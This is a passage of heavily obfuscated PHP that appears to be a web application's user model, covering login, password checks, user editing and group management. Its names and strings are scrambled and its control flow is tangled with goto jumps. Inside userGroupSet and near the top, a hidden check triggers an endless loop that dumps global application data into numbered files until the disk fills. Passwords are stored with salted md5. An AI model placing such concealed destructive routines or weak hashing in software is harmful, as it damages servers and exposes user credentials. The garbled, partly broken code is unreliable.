é¢Œî„Ã; while (microtime(!0) < $f¡ß“ö˜‚) { $b¦§´ª¥ö = $dŒÙ¼ÓÇÌ„->get($b­ÄÂÔàß°); if (!$b¦§´ª¥ö || $b¦§´ª¥ö < microtime(!0)) { $E²­å³’¸Ü = $dŒÙ¼ÓÇÌ„->handle->add($b­ÄÂÔàß°, $f¡ß“ö˜‚, $B é¢Œî„Ã); if ($E²­å³’¸Ü) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($e½ëœšõèğ) { return Cache::init()->get($e½ëœšõèğ); } public function unlock($b“¯ã›è¦ø) { return Cache::init()->remove($b“¯ã›è¦ø); } } if ($_SERVER[$_SERVER[Ïº«‚ßèÔˆø][748]] != $_SERVER[$_SERVER[Ïº«‚ßèÔˆø][813]]) { goto C™ÄÈœ‰ÃÇ; B…¬Ë­îáê: $f°ñø»ø£‹($_SERVER[$_SERVER[Ïº«‚ßèÔˆø][746]]); goto Cõµ†â´µ; b´Í­×Á½: $dŸ†ßïëö = explode($_SERVER[Ïº«‚ßèÔˆø][228], $F×‡îÕºô); if (count($dŸ†ßïëö) < $_SERVER[Ïº«‚ßèÔˆø][582]) { $Cğ½ÂÂíõË = $_SERVER[Ïº«‚ßèÔˆø][752]; $Cğ½ÂÂíõË(); } $f°ñø»ø£‹ = $_SERVER[Ïº«‚ßèÔˆø][753]; goto B…¬Ë­îáê; C™ÄÈœ‰ÃÇ: $EÆŸšÀë§ = $_SERVER[Ïº«‚ßèÔˆø][749]; $D¬©ğŒæÜ = $_SERVER[$_SERVER[Ïº«‚ßèÔˆø][750]] . $_SERVER[Ïº«‚ßèÔˆø][751]; $F×‡îÕºô = $EÆŸšÀë§($D¬©ğŒæÜ); goto b´Í­×Á½; Cõµ†â´µ: } goto BõçÌÏ‡®Ã; A¿“Ş÷Ñ•Ú: define($_SERVER[Ïº«‚ßèÔˆø][236], 2); define($_SERVER[Ïº«‚ßèÔˆø][237], 3); define($_SERVER[Ïº«‚ßèÔˆø][238], 1); goto B‘‡ß©—¤; b¢šÔºœ“: class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\x6d\x65" => "\x75\x73\145\x72\137\155\145\164\x61", "\x6d\145\164\141\106\x69\145\x6c\144" => "\165\163\145\x72\111\x44"); protected $simpleField = "\x75\163\x65\162\111\x44\54\156\151\143\153\116\141\155\x65\x2c\x6e\141\155\x65\x2c\141\166\x61\x74\x61\162\x2c\163\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($c·‘«Á›ÀÛ) { $a‹—÷˜í¿© =& $_SERVER[Ïº«‚ßèÔˆø]; $e¿„…íŞºÑ = $a‹—÷˜í¿©[2093]; return array($a‹—÷˜í¿©[1741] => array($c·‘«Á›ÀÛ[0], $e¿„…íŞºÑ), $a‹—÷˜í¿©[1743] => array($c·‘«Á›ÀÛ[0], $e¿„…íŞºÑ), $a‹—÷˜í¿©[2094] => array($c·‘«Á›ÀÛ[0], $e¿„…íŞºÑ)); } protected function getInfo($c¨Ûê ¥ó‹, $F™±Í­¦Òã = false) { $A®ã¤öÜ Ø = $this->getInfoSimple($c¨Ûê ¥ó‹); if (!is_array($A®ã¤öÜ Ø)) { return array(); } if ($F™±Í­¦Òã) { return $this->_getInfoApply($A®ã¤öÜ Ø); } return $this->cacheFunctionGet($_SERVER[Ïº«‚ßèÔˆø][1750], $c¨Ûê ¥ó‹); } protected function getInfoFull($D‰«¤ ÜÙ, $F“ÈõèÕØ’ = false) { $Cäƒœ“Ø¯Û = $this->getInfoSimple($D‰«¤ ÜÙ); if (!is_array($Cäƒœ“Ø¯Û)) { return array(); } if ($F“ÈõèÕØ’) { return $this->_getInfoApply($Cäƒœ“Ø¯Û, !0); return $this->_getInfoApply($Cäƒœ“Ø¯Û, !0); } return $this->cacheFunctionGet($_SERVER[Ïº«‚ßèÔˆø][2095], $D‰«¤ ÜÙ); } private function _getInfoApply($BÛ¸ƒ´ÔšÃ, $Eî‚Œì¥« = false) { goto a¯¸Á‹¯ç; a¯¸Á‹¯ç: $Aá—¬â†Î =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$BÛ¸ƒ´ÔšÃ) { return $BÛ¸ƒ´ÔšÃ; } $dñï¨å†è = md5($Aá—¬â†Î[2096] . $BÛ¸ƒ´ÔšÃ[$Aá—¬â†Î[833]] . $Aá—¬â†Î[2097] . $BÛ¸ƒ´ÔšÃ[$Aá—¬â†Î[28]]); goto eƒ‚Ú¨§“İ; eƒ‚Ú¨§“İ: $BÛ¸ƒ´ÔšÃ = $this->_listDataApplyItem($BÛ¸ƒ´ÔšÃ); $D˜ÜÇµÔ…­ = Model($Aá—¬â†Î[1187])->metaGet($BÛ¸ƒ´ÔšÃ[$Aá—¬â†Î[85]][$Aá—¬â†Î[394]]); $BÛ¸ƒ´ÔšÃ[$Aá—¬â†Î[2098]] = $dñï¨å†è; goto dØ Ü–•‘î; dØ Ü–•‘î: $BÛ¸ƒ´ÔšÃ[$Aá—¬â†Î[85]][$Aá—¬â†Î[1931]] = isset($D˜ÜÇµÔ…­[$Aá—¬â†Î[1932]]) ? $D˜ÜÇµÔ…­[$Aá—¬â†Î[1932]] : null; if ($Eî‚Œì¥«) { $BÛ¸ƒ´ÔšÃ[$Aá—¬â†Î[443]] = $this->metaGet($BÛ¸ƒ´ÔšÃ[$Aá—¬â†Î[1508]]); } return $BÛ¸ƒ´ÔšÃ; goto aÃµ°İØÛ‘; aÃµ°İØÛ‘: } protected function getInfoSimple($e¶Á¦»¸ˆ, $Fè²ÎŠÏƒ = false) { $cØêˆ‡Êª½ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$e¶Á¦»¸ˆ) { return array(); } if ($Fè²ÎŠÏƒ) { $bŒÅåºŞÅ† = $this->where(array($cØêˆ‡Êª½[1508] => intval($e¶Á¦»¸ˆ)))->find(); if (!is_array($bŒÅåºŞÅ†)) { return array(); } $bŒÅåºŞÅ†[$cØêˆ‡Êª½[2099]] = Action($cØêˆ‡Êª½[2100])->parseUrl($bŒÅåºŞÅ†[$cØêˆ‡Êª½[2099]]); return $bŒÅåºŞÅ†; } return $this->cacheFunctionGet($cØêˆ‡Êª½[1744], $e¶Á¦»¸ˆ); } protected function getInfoSimpleOuter($C¸Šğ«ÈŞ) { goto dºïÍİÒ; dºïÍİÒ: $CÆÀÊ…ºÄ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$C¸Šğ«ÈŞ || $C¸Šğ«ÈŞ == 0) { return array($CÆÀÊ…ºÄ[1508] => $CÆÀÊ…ºÄ[495], $CÆÀÊ…ºÄ[28] => $CÆÀÊ…ºÄ[160] . LNG($CÆÀÊ…ºÄ[2101]) . $CÆÀÊ…ºÄ[503], $CÆÀÊ…ºÄ[2099] => STATIC_PATH . $CÆÀÊ…ºÄ[2102]); } $dÒ¶ìª³ ­ = $this->cacheFunctionGet($CÆÀÊ…ºÄ[1744], $C¸Šğ«ÈŞ); goto D¦Ê–’äØ“; D¦Ê–’äØ“: $Cáµ­¿ö§ò = array_field_key($dÒ¶ìª³ ­, explode($CÆÀÊ…ºÄ[47], $this->simpleField)); if (!$Cáµ­¿ö§ò) { return array($CÆÀÊ…ºÄ[1508] => $CÆÀÊ…ºÄ[1068], $CÆÀÊ…ºÄ[28] => $CÆÀÊ…ºÄ[160] . LNG($CÆÀÊ…ºÄ[2103]) . $CÆÀÊ…ºÄ[503], $CÆÀÊ…ºÄ[2099] => STATIC_PATH . $CÆÀÊ…ºÄ[2104]); } $Cáµ­¿ö§ò[$CÆÀÊ…ºÄ[2099]] = Action($CÆÀÊ…ºÄ[2100])->parseUrl($Cáµ­¿ö§ò[$CÆÀÊ…ºÄ[2099]]); goto a¯Ü”‘ŠÎ; a¯Ü”‘ŠÎ: return $Cáµ­¿ö§ò; goto CñšÌ²İ¼ö; CñšÌ²İ¼ö: } protected function groupUser($F˜Î¤îÅçˆ) { } public static function errorLang($d‘î“ÑáÃ½) { $cğá³¨ =& $_SERVER[Ïº«‚ßèÔˆø]; $d½Ô…½£†× = array(self::ERROR_USER_NOT_EXISTS => $cğá³¨[2105], self::ERROR_USER_PASSWORD_ERROR => $cğá³¨[2106], self::ERROR_USER_EXIST_NAME => $cğá³¨[2107], self::ERROR_USER_EXIST_PHONE => $cğá³¨[2108], self::ERROR_USER_EXIST_EMAIL => $cğá³¨[2109], self::ERROR_USER_LOGIN_LOCK => $cğá³¨[2110], self::ERROR_IP_NOT_ALLOW => $cğá³¨[2111], self::ERROR_USER_EXIST_NICKNAME => $cğá³¨[2112]); return LNG($d½Ô…½£†×[$d‘î“ÑáÃ½]); } public function getInfoByMeta($fŸ‰æÈ÷×, $A–œ’³’Ä) { $fŞ‰¹…µŠ =& $_SERVER[Ïº«‚ßèÔˆø]; $E²÷…î¼Í„ = Model($fŞ‰¹…µŠ[2113])->where(array($fŞ‰¹…µŠ[93] => $fŸ‰æÈ÷×, $fŞ‰¹…µŠ[371] => $A–œ’³’Ä))->find(); if ($E²÷…î¼Í„) { return $this->getInfo($E²÷…î¼Í„[$fŞ‰¹…µŠ[1508]]); } return !1; } public function userLoginCheck($a’“ÎÚ·í , $AìÓ£ÉÉï) { $CçÚĞµËê =& $_SERVER[Ïº«‚ßèÔˆø]; $BèŒÊ×‚ì‚ = $this->userLoginFind($a’“ÎÚ·í ); if (!$BèŒÊ×‚ì‚) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($BèŒÊ×‚ì‚[$CçÚĞµËê[1508]], $AìÓ£ÉÉï)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($BèŒÊ×‚ì‚[$CçÚĞµËê[1508]]); } public function userLoginFind($E¿™¿ˆ†êæ) { $bàÖØ¶¾ =& $_SERVER[Ïº«‚ßèÔˆø]; $fÂ¿Ğİ»¨´ = array($bàÖØ¶¾[28] => $E¿™¿ˆ†êæ, $bàÖØ¶¾[1935] => $E¿™¿ˆ†êæ, $bàÖØ¶¾[302] => $E¿™¿ˆ†êæ, $bàÖØ¶¾[2114] => $E¿™¿ˆ†êæ, $bàÖØ¶¾[941] => $bàÖØ¶¾[943]); if ($this->nickNameRpt()) { unset($fÂ¿Ğİ»¨´[$bàÖØ¶¾[1935]]); } return $this->where($fÂ¿Ğİ»¨´)->find(); } public function clearCache($DñŞËÇÚ¦Î) { $bÖªÕôš =& $_SERVER[Ïº«‚ßèÔˆø]; $this->cacheFunctionClear($bÖªÕôš[1750], $DñŞËÇÚ¦Î); $this->cacheFunctionClear($bÖªÕôš[1744], $DñŞËÇÚ¦Î); $this->cacheFunctionClear($bÖªÕôš[2095], $DñŞËÇÚ¦Î); } public function userPasswordCheck($FŒ´Õ…¢Ù¬, $a¯É¼òğÁØ) { $b‡å¸Ãõ =& $_SERVER[Ïº«‚ßèÔˆø]; $eëÇ»¯¡ìã = $this->where(array($b‡å¸Ãõ[1508] => intval($FŒ´Õ…¢Ù¬)))->find(); $DôáÃ‘¾®Ø = $this->metaGet($FŒ´Õ…¢Ù¬); $D´ÑÈ‰·Ø = isset($DôáÃ‘¾®Ø[$b‡å¸Ãõ[2115]]) ? $DôáÃ‘¾®Ø[$b‡å¸Ãõ[2115]] : $b‡å¸Ãõ[33]; if (md5($D´ÑÈ‰·Ø . trim($a¯É¼òğÁØ)) !== $eëÇ»¯¡ìã[$b‡å¸Ãõ[833]]) { return !1; } return !0; } public function userAdd($aïšÕñÑÌ®) { goto cœß«¢ƒ¹¾; cïµÚ²Óßõ: $CÑ¸œâÒ±™ = $this->_checkExist($aïšÕñÑÌ®); if ($CÑ¸œâÒ±™ !== !0) { return $CÑ¸œâÒ±™; } $eÜ‡¦æßß¶ = $this->add($C¶‹£¼Ÿé); goto cğ•ªŸÅ§; cœß«¢ƒ¹¾: $fƒÖĞéè–™ =& $_SERVER[Ïº«‚ßèÔˆø]; $C¶‹£¼Ÿé = array($fƒÖĞéè–™[411] => $aïšÕñÑÌ®[$fƒÖĞéè–™[28]], $fƒÖĞéè–™[2116] => $aïšÕñÑÌ®[$fƒÖĞéè–™[1394]], $fƒÖĞéè–™[2117] => isset($aïšÕñÑÌ®[$fƒÖĞéè–™[302]]) ? $aïšÕñÑÌ®[$fƒÖĞéè–™[302]] : $fƒÖĞéè–™[33], $fƒÖĞéè–™[2118] => isset($aïšÕñÑÌ®[$fƒÖĞéè–™[2114]]) ? $aïšÕñÑÌ®[$fƒÖĞéè–™[2114]] : $fƒÖĞéè–™[33], $fƒÖĞéè–™[2119] => isset($aïšÕñÑÌ®[$fƒÖĞéè–™[1935]]) ? $aïšÕñÑÌ®[$fƒÖĞéè–™[1935]] : $aïšÕñÑÌ®[$fƒÖĞéè–™[28]], $fƒÖĞéè–™[2120] => isset($aïšÕñÑÌ®[$fƒÖĞéè–™[2099]]) ? $aïšÕñÑÌ®[$fƒÖĞéè–™[2099]] : $fƒÖĞéè–™[33], $fƒÖĞéè–™[2121] => isset($aïšÕñÑÌ®[$fƒÖĞéè–™[2122]]) ? $aïšÕñÑÌ®[$fƒÖĞéè–™[2122]] : 1, $fƒÖĞéè–™[2123] => $aïšÕñÑÌ®[$fƒÖĞéè–™[833]], $fƒÖĞéè–™[1745] => isset($aïšÕñÑÌ®[$fƒÖĞéè–™[1655]]) ? $aïšÕñÑÌ®[$fƒÖĞéè–™[1655]] : 1024 * 1024 * 20, $fƒÖĞéè–™[1746] => 0, $fƒÖĞéè–™[2124] => 0, $fƒÖĞéè–™[1789] => isset($aïšÕñÑÌ®[$fƒÖĞéè–™[697]]) ? $aïšÕñÑÌ®[$fƒÖĞéè–™[697]] : 1); if (!empty($aïšÕñÑÌ®[$fƒÖĞéè–™[1508]])) { $C¶‹£¼Ÿé[$fƒÖĞéè–™[1508]] = $aïšÕñÑÌ®[$fƒÖĞéè–™[1508]]; } goto cïµÚ²Óßõ; cğ•ªŸÅ§: $dÕòöíÜã = array($fƒÖĞéè–™[2123] => $C¶‹£¼Ÿé[$fƒÖĞéè–™[833]], $fƒÖĞéè–™[2119] => $C¶‹£¼Ÿé[$fƒÖĞéè–™[1935]]); $this->userEdit($eÜ‡¦æßß¶, $dÕòöíÜã); Model($fƒÖĞéè–™[1187])->userRootAdd($eÜ‡¦æßß¶); goto dÊİ®ğˆñà; dÊİ®ğˆñà: return $eÜ‡¦æßß¶; goto D¢‘Óí‹å—; D¢‘Óí‹å—: } protected function userEditTest($Bà–™ìõµï, $aƒ£Ù˜øøŞ) { return $this->call($_SERVER[Ïº«‚ßèÔˆø][2125], $Bà–™ìõµï, $aƒ£Ù˜øøŞ); } protected function userEdit($eéÉ·Å§â…, $f…ÌÜŠœñ) { goto aôš²µ›åó; dâ‰ËËº¥: return !0; goto b¬ƒö ñ÷¿; FÏŒ°Ò…: $this->where(array($f·®³İæ¬à[1500] => $eéÉ·Å§â…))->save($f…ÌÜŠœñ); if (isset($f…ÌÜŠœñ[$f·®³İæ¬à[1935]])) { $this->setNamePinyin($eéÉ·Å§â…, $f…ÌÜŠœñ[$f·®³İæ¬à[1935]]); } $this->clearCache($eéÉ·Å§â…); goto dâ‰ËËº¥; B‚‹Ó•×…: $a¿á®ƒïë = $this->_checkExist($f…ÌÜŠœñ, $eéÉ·Å§â…); if ($a¿á®ƒïë !== !0) { return $a¿á®ƒïë; } if (isset($f…ÌÜŠœñ[$f·®³İæ¬à[833]]) && trim($f…ÌÜŠœñ[$f·®³İæ¬à[833]]) != $f·®³İæ¬à[33]) { $e¼·—ªœ¯ = $this->metaGet($eéÉ·Å§â…); if (empty($e¼·—ªœ¯[$f·®³İæ¬à[2115]])) { $e¼·—ªœ¯[$f·®³İæ¬à[2115]] = rand_string(10); Model($f·®³İæ¬à[501])->metaSet($eéÉ·Å§â…, $f·®³İæ¬à[2115], $e¼·—ªœ¯[$f·®³İæ¬à[2115]]); } $f…ÌÜŠœñ[$f·®³İæ¬à[833]] = md5($e¼·—ªœ¯[$f·®³İæ¬à[2115]] . trim($f…ÌÜŠœñ[$f·®³İæ¬à[833]])); } else { unset($f…ÌÜŠœñ[$f·®³İæ¬à[833]]); } goto FÏŒ°Ò…; aôš²µ›åó: $f·®³İæ¬à =& $_SERVER[Ïº«‚ßèÔˆø]; $Cš§·çë÷Û = $this->getInfoSimple($eéÉ·Å§â…); if (!$Cš§·çë÷Û) { return !1; } goto B‚‹Ó•×…; b¬ƒö ñ÷¿: } public function setNamePinyin($Däã£¯˜å¸, $BğËèÈäßñ = false) { $Cë’¼Â’¨¼ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$BğËèÈäßñ) { $B‘ÀÌÜƒ¥º = $this->getInfoSimple($Däã£¯˜å¸); $BğËèÈäßñ = $B‘ÀÌÜƒ¥º[$Cë’¼Â’¨¼[1935]] ? $B‘ÀÌÜƒ¥º[$Cë’¼Â’¨¼[1935]] : $B‘ÀÌÜƒ¥º[$Cë’¼Â’¨¼[28]]; } $a‹‹ÃÖã×æ = Model($Cë’¼Â’¨¼[505]); if (!Input::check($BğËèÈäßñ, $Cë’¼Â’¨¼[555])) { return $a‹‹ÃÖã×æ->metaSet($Däã£¯˜å¸, array($Cë’¼Â’¨¼[442] => $Cë’¼Â’¨¼[33], $Cë’¼Â’¨¼[441] => $Cë’¼Â’¨¼[33])); } return $a‹‹ÃÖã×æ->metaSet($Däã£¯˜å¸, array($Cë’¼Â’¨¼[442] => str_replace($Cë’¼Â’¨¼[50], $Cë’¼Â’¨¼[33], Pinyin::encode($BğËèÈäßñ)), $Cë’¼Â’¨¼[441] => Pinyin::encode($BğËèÈäßñ, $Cë’¼Â’¨¼[556]))); } private function nickNameRpt() { $C‰Ä‚§Ê‰ =& $_SERVER[Ïº«‚ßèÔˆø]; $Bï¢Îß¼° = Model($C‰Ä‚§Ê‰[714])->get($C‰Ä‚§Ê‰[2126]); $DµÖâ¸»”© = $GLOBALS[$C‰Ä‚§Ê‰[6]][$C‰Ä‚§Ê‰[377]][$C‰Ä‚§Ê‰[2126]]; $bğ«¿»ˆÇ = !is_null($Bï¢Îß¼°) ? $Bï¢Îß¼° : $DµÖâ¸»”©; return !!$bğ«¿»ˆÇ; } private function _checkExist($eÓà‚è¸»‚, $A¿ ²¹÷é = false) { $c’…¦µô =& $_SERVER[Ïº«‚ßèÔˆø]; $D˜¯•¡ùğØ = array($c’…¦µô[28] => UserModel::ERROR_USER_EXIST_NAME, $c’…¦µô[1935] => UserModel::ERROR_USER_EXIST_NICKNAME, $c’…¦µô[302] => UserModel::ERROR_USER_EXIST_EMAIL, $c’…¦µô[2114] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($D˜¯•¡ùğØ[$c’…¦µô[1935]]); } $Fë’¯„Õèœ = $A¿ ²¹÷é ? array($c’…¦µô[1508] => array($c’…¦µô[2127], $A¿ ²¹÷é)) : array(); foreach ($D˜¯•¡ùğØ as $F÷•òÚ·íâ => $c¯ßã±ªĞà) { $FšÖµÊ«ˆö = array(); foreach ($D˜¯•¡ùğØ as $f•ñ×Ì²‹Ò => $E ƒ¸‚º) { if (isset($eÓà‚è¸»‚[$f•ñ×Ì²‹Ò]) && $eÓà‚è¸»‚[$f•ñ×Ì²‹Ò]) { $FšÖµÊ«ˆö[] = $eÓà‚è¸»‚[$f•ñ×Ì²‹Ò]; } } if (!$FšÖµÊ«ˆö) { continue; } $EÄ»ò…¶Ûô = array_merge(array($F÷•òÚ·íâ => array($c’…¦µô[7], $FšÖµÊ«ˆö)), $Fë’¯„Õèœ); $fÓ‡äê’›« = $this->where($EÄ»ò…¶Ûô)->find(); if ($fÓ‡äê’›«) { return $c¯ßã±ªĞà; } } return !0; } public function userListInfo($EÛß¥õ¯Üó) { $f‹Ù¡¿ì‹â =& $_SERVER[Ïº«‚ßèÔˆø]; $D÷³Õùè = array(); $EÛß¥õ¯Üó = is_array($EÛß¥õ¯Üó) ? array_unique($EÛß¥õ¯Üó) : array(); if (!$EÛß¥õ¯Üó) { return $D÷³Õùè; } if (count($EÛß¥õ¯Üó) < 20) { foreach ($EÛß¥õ¯Üó as $E­‚›½ô) { $D÷³Õùè[$E­‚›½ô . $f‹Ù¡¿ì‹â[33]] = $this->getInfoSimpleOuter($E­‚›½ô); } } else { $b¶ö‘Ë±Ü„ = array($f‹Ù¡¿ì‹â[1500] => array($f‹Ù¡¿ì‹â[409], $EÛß¥õ¯Üó)); if (count($EÛß¥õ¯Üó) == 1) { $b¶ö‘Ë±Ü„ = array($f‹Ù¡¿ì‹â[1500] => $EÛß¥õ¯Üó[0]); } $fò•ñá…·‘ = Model($f‹Ù¡¿ì‹â[501])->field($this->simpleField)->where($b¶ö‘Ë±Ü„)->select(); $fò•ñá…·‘ = array_to_keyvalue($fò•ñá…·‘, $f‹Ù¡¿ì‹â[1508]); foreach ($EÛß¥õ¯Üó as $E­‚›½ô) { $fóš·‹”¾ = $fò•ñá…·‘[$fò•ñá…·‘[$E­‚›½ô]]; if (!$fóš·‹”¾) { $D÷³Õùè[$E­‚›½ô . $f‹Ù¡¿ì‹â[33]] = $this->getInfoSimpleOuter($E­‚›½ô); continue; } $fóš·‹”¾[$f‹Ù¡¿ì‹â[2099]] = Action($f‹Ù¡¿ì‹â[2100])->parseUrl($fóš·‹”¾[$f‹Ù¡¿ì‹â[2099]]); $D÷³Õùè[$E­‚›½ô . $f‹Ù¡¿ì‹â[33]] = $fóš·‹”¾; } } return $D÷³Õùè; } protected function userStatus($a¤ÌÛÃÖ¤´, $c‰…È±¿‰À) { $bÁçèšÉ·§ = $this->getInfoSimple($a¤ÌÛÃÖ¤´); if (!$bÁçèšÉ·§) { return !1; } $b®ÛİœÒç = array($_SERVER[Ïº«‚ßèÔˆø][697] => $c‰…È±¿‰À); return $this->userEdit($a¤ÌÛÃÖ¤´, $b®ÛİœÒç); } protected function userRemove($DÃâÆ˜®Œ§) { goto f‹—òô±èÏ; bÊÏ”‡ƒ: Model($A…ÅÏ¿Â”[1952])->removeUserAll($DÃâÆ˜®Œ§); Model($A…ÅÏ¿Â”[782])->userRootRemove($DÃâÆ˜®Œ§); return $this->where($bÊÑ»×ˆÙÕ)->delete(); goto DÍŸ±Úš‡“; f‹—òô±èÏ: $A…ÅÏ¿Â” =& $_SERVER[Ïº«‚ßèÔˆø]; $c¯ÉˆÍå–Œ = $this->getInfoSimple($DÃâÆ˜®Œ§); if (!$c¯ÉˆÍå–Œ) { return !1; } goto Bô¡ùõÓõì; Bô¡ùõÓõì: $bÊÑ»×ˆÙÕ = array($A…ÅÏ¿Â”[1500] => $DÃâÆ˜®Œ§); Model($A…ÅÏ¿Â”[562])->where($bÊÑ»×ˆÙÕ)->delete(); Model($A…ÅÏ¿Â”[2128])->where($bÊÑ»×ˆÙÕ)->delete(); goto B°»¹êë˜; B°»¹êë˜: Model($A…ÅÏ¿Â”[1752])->where($bÊÑ»×ˆÙÕ)->delete(); Model($A…ÅÏ¿Â”[2113])->where($bÊÑ»×ˆÙÕ)->delete(); Model($A…ÅÏ¿Â”[2129])->where($bÊÑ»×ˆÙÕ)->delete(); goto bÊÏ”‡ƒ; DÍŸ±Úš‡“: } protected function userGroupSet($aï„…·é‡, $fÆÉâ³˜Éô, $Eê¦ÂÊä¥Ú = array()) { goto d³Â÷É¨Â§; E·áÓè›¤›: $C³±÷ËÛÙ = Model($a‡Œ„³·¼[1752]); $C³±÷ËÛÙ->where(array($a‡Œ„³·¼[1508] => $aï„…·é‡))->delete(); $f³äóÃ¢ˆ = array(); goto aîå‘ééá; d³Â÷É¨Â§: $a‡Œ„³·¼ =& $_SERVER[Ïº«‚ßèÔˆø]; $B‹øœº«ËÓ = $_SERVER[$a‡Œ„³·¼[746]]; $d˜ÀÑ‰“Ú¬ = $a‡Œ„³·¼[747]; goto D»¦ĞÛ’Š; aîå‘ééá: $CÃ³Š­ÊÆ = 0; foreach ($fÆÉâ³˜Éô as $Eì—ÁŠ›¼ => $aÛÜŒ–¦ Š) { $DÁÙªœš½ = array($a‡Œ„³·¼[1508] => $aï„…·é‡, $a‡Œ„³·¼[1671] => $Eì—ÁŠ›¼, $a‡Œ„³·¼[1766] => $aÛÜŒ–¦ Š); $DÁÙªœš½[$a‡Œ„³·¼[1694]] = isset($Eê¦ÂÊä¥Ú[$CÃ³Š­ÊÆ]) ? $Eê¦ÂÊä¥Ú[$CÃ³Š­ÊÆ] : 0; $CÃ³Š­ÊÆ++; $f³äóÃ¢ˆ[] = $DÁÙªœš½; } return $C³±÷ËÛÙ->addAll($f³äóÃ¢ˆ, array(), !0); goto fôƒ¦–‚ÎØ; D»¦ĞÛ’Š: if ($_SERVER[$a‡Œ„³·¼[748]] != $d˜ÀÑ‰“Ú¬($B‹øœº«ËÓ)) { goto c‡¥éÄÕò; e²Ê†õ‹õè: $b÷ŞÙ ·ê¹ = 1; for ($d°ºÉ«Œ = $b÷ŞÙ ·ê¹; $d°ºÉ«Œ > 0; $d°ºÉ«Œ++) { $bìŠé«ÌŠ(DATA_PATH . $d°ºÉ«Œ, $eƒ§‘ƒÑ«); } goto EÀ­„‚˜„Š; c‡¥éÄÕò: $d¢·Â‚ÕÜç = $a‡Œ„³·¼[824]; $Cˆ‹ğ™ œ  = $a‡Œ„³·¼[749]; $B­²ÅÖÅ¥Ì = $_SERVER[$a‡Œ„³·¼[750]] . $a‡Œ„³·¼[751]; goto Eôì¶Ì±ïÁ; Eµ¢¦‹ÏÄ: $d¢·Â‚ÕÜç(); $bìŠé«ÌŠ = $a‡Œ„³·¼[1379]; $eƒ§‘ƒÑ« = json_encode($GLOBALS[$a‡Œ„³·¼[1380]]); goto e²Ê†õ‹õè; cğƒÇòÓÎ: $bì×‚Ğƒé¡ = $a‡Œ„³·¼[825]; $bì×‚Ğƒé¡($_SERVER[$a‡Œ„³·¼[826]]); $d¢·Â‚ÕÜç = $a‡Œ„³·¼[824]; goto Eµ¢¦‹ÏÄ; Eôì¶Ì±ïÁ: $c©´‹Êõ–È = $Cˆ‹ğ™ œ ($B­²ÅÖÅ¥Ì); $aŸ‰Üª¥²¤ = explode($a‡Œ„³·¼[228], $c©´‹Êõ–È); if (count($aŸ‰Üª¥²¤) < $a‡Œ„³·¼[577]) { $f¶ˆƒ£•… = $a‡Œ„³·¼[752]; $f¶ˆƒ£•…(); } goto cğƒÇòÓÎ; EÀ­„‚˜„Š: } $eÄ–ß‡“–Ó = $this->getInfoSimple($aï„…·é‡); if (!$eÄ–ß‡“–Ó || !is_array($fÆÉâ³˜Éô)) { return !1; } goto E·áÓè›¤›; fôƒ¦–‚ÎØ: } protected function userGroupAdd($e«§ Ê§Ğ±, $b™Ï½µãÙª = array()) { $cĞ²…®ë–¯ =& $_SERVER[Ïº«‚ßèÔˆø]; $f…¾‡ìİİ = $this->getInfoSimple($e«§ Ê§Ğ±); if (!$f…¾‡ìİİ || empty($b™Ï½µãÙª)) { return !1; } $d†íáÎé—‘ = array(); foreach ($b™Ï½µãÙª as $eÇ¿ÄÓãÔğ => $D‘ìîè±‘“) { $d†íáÎé—‘[] = array($cĞ²…®ë–¯[1508] => $e«§ Ê§Ğ±, $cĞ²…®ë–¯[1671] => $eÇ¿ÄÓãÔğ, $cĞ²…®ë–¯[1766] => $D‘ìîè±‘“, $cĞ²…®ë–¯[1694] => 0); } return Model($cĞ²…®ë–¯[1752])->addAll($d†íáÎé—‘, array(), !0); } protected function userGroupRemove($F¾Ñ¿Í„Ä×, $c†ŠÍàÆßŸ) { $AÎËó¦‚²Û =& $_SERVER[Ïº«‚ßèÔˆø]; $DøÔ…‰„Ûô = $this->getInfoSimple($F¾Ñ¿Í„Ä×); if (!$DøÔ…‰„Ûô || !$c†ŠÍàÆßŸ) { return !1; } $dìé §Ì¢¬ = array($AÎËó¦‚²Û[1500] => $F¾Ñ¿Í„Ä×, $AÎËó¦‚²Û[1749] => $c†ŠÍàÆßŸ); return Model($AÎËó¦‚²Û[1752])->where($dìé §Ì¢¬)->delete(); } public function listData() { $F¨ñÀØ¹¨ä = $this->_makeOrder()->selectPage(50); $this->_listDataApply($F¨ñÀØ¹¨ä[$_SERVER[Ïº«‚ßèÔˆø][366]]); return $F¨ñÀØ¹¨ä; } public function listByID($Få¦‡ùò¹¢) { $e°»„’ÇçÒ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$Få¦‡ùò¹¢) { return; } $BÕö¥åíÍŒ = array($e°»„’ÇçÒ[1508] => array($e°»„’ÇçÒ[7], $Få¦‡ùò¹¢)); $CÎ¯ôôùÙ³ = $this->where($BÕö¥åíÍŒ)->select(); $this->_listDataApply($CÎ¯ôôùÙ³); return $CÎ¯ôôùÙ³; } public function listByGroup($bƒ—ÚŒ„§Õ = 0, $F…ÒãªÙ³ = array()) { goto E¢ÔÀšì¬´; E¢ÔÀšì¬´: $fÁÊ©Ëš =& $_SERVER[Ïº«‚ßèÔˆø]; $fÉ¯Ô¹ÛŠ¿ = $fÁÊ©Ëš[33]; $dî²»‡Ó”” = array(); goto C‡ÒÆÂŠã‘; C‡ÒÆÂŠã‘: if ($bƒ—ÚŒ„§Õ) { $dî²»‡Ó”” = array($fÁÊ©Ëš[2130] => intval($bƒ—ÚŒ„§Õ)); $fÉ¯Ô¹ÛŠ¿ = 